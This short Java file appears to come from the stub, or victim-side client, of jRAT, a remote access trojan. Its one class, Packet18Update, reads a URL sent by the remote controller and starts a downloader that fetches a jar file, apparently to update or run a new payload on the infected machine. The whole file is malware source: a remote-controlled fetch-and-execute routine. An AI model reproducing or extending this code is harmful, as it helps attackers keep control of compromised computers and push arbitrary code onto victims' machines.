package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Downloader;

public class Packet18Update extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String url = con.readLine();
		boolean fromLocal = con.readBoolean();
		new Downloader(con, url, true, "jar", fromLocal).start();
	}

}
